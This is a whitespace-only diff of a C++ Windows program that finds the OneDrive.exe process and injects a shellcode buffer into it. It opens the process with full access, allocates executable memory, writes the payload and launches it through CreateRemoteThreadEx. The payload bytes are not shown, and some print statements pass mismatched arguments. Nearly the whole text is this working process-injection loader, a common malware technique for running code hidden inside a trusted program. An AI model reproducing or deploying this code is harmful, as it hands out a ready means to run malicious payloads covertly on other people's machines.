@@ -70,7 +70,7 @@ BOOL GetOneDrivePID(DWORD pid) {
             GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
         }
 
-
+        
     }
     _tprintf(TEXT("NAME: %s ---> PID: (%d)\n"), szProcessName, pid);
 
@@ -78,10 +78,10 @@ BOOL GetOneDrivePID(DWORD pid) {
         CloseHandle(hProcess);
         return TRUE;
     }
-
+    
     CloseHandle(hProcess);
     return FALSE;
-}
+}   
 
 void OpenNotepad() {
     ShellExecute(NULL, NULL, L"C:\\Windows\\notepad.exe", NULL, NULL, SW_SHOWNORMAL);
@@ -89,7 +89,7 @@ void OpenNotepad() {
 
 int main() {
     DWORD aProcesses[1024], cProcesses, cbNeeded;
-
+    
     OpenNotepad();
     printf("%s Error: %ld", e, GetLastError());
 
@@ -97,52 +97,52 @@ int main() {
         std::cout << GetLastError() << std::endl;
         return EXIT_FAILURE;
     }
-
+    
     // Calculate amount of proccesses enumerated
     cProcesses = cbNeeded / sizeof(DWORD);
-
+    
     for (int i = 0; i < cProcesses; i++)
     {
         if (aProcesses[i] != 0)
         {
             if (GetOneDrivePID(aProcesses[i]))
-            {
+            { 
                 pidFound = TRUE;
                 dPid = aProcesses[i];
                 break;
             }
         }
     }
-
+    
     if (!pidFound) {
         printf("%s Did'nt find the OneDrive.exe process\n", i);
         std::cin.get();
         return EXIT_FAILURE;
     }
-
+    
     printf("%s Trying to open a handle to process: (%d) \n", i, dPid);
-
+    
     // Open A handle to the desired process
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dPid);
-
+    
     if (NULL == hProcess) {
         printf("%s couldn't open a handle to the process (%ld)\n Error: %ld\n", e, dPid, GetLastError());
         std::cin.get();
         return EXIT_FAILURE;
     }
-
+    
     printf("%s successfuly opened a handle to the process (%ld)", k, dPid);
-
+    
     rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(sCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
     printf("%s successfuly aloccated a size of %zu bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(sCode));
-
+    
 
     // Write the process memory
     if (WriteProcessMemory(hProcess, rBuffer, sCode, sizeof(sCode), NULL))
         printf("%s successfuly written to the process' memory\n", k);
     else
         return EXIT_FAILURE;
-
+    
     hThread = CreateRemoteThreadEx(
         hProcess,
         NULL,
@@ -153,13 +153,13 @@ int main() {
         0,
         &TID
     );
-
+    
     if (hThread == NULL) {
         printf("%s failed to get a handle to the thread (%ld)\n Error: %ld\n", e, TID, GetLastError());
     }
 
     CloseHandle(hProcess);
-
-
+    
+    
     return EXIT_SUCCESS;
 }
